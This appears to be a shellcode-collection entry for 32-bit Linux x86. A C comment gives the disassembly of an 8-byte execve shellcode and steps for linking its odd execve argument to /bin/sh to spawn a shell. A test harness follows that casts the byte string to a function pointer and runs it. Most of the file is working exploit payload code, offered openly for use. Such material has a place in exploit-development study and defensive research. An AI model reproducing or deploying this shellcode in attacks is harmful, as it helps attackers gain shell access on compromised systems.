/*
08048334 <main>:
 8048334:	99                   	cltd
 8048335:	6a 0b                	push   $0xb
 8048337:	58                   	pop    %eax
 8048338:	60                   	pusha
 8048339:	59                   	pop    %ecx
 804833a:	cd 80                	int    $0x80

using this code.

step1. This code is compiled.
step2. strace -x output binary
step3. get execve args in strace result.
step4. create link execve args on /bin/sh

*/

unsigned char sc[]=
"\x99\x6a\x0b\x58\x60\x59\xcd\x80";
int main()
{
	void (*p)();
	p = sc;
	p();
}

have a nice day~

thx~

--
INTO THE WORLD!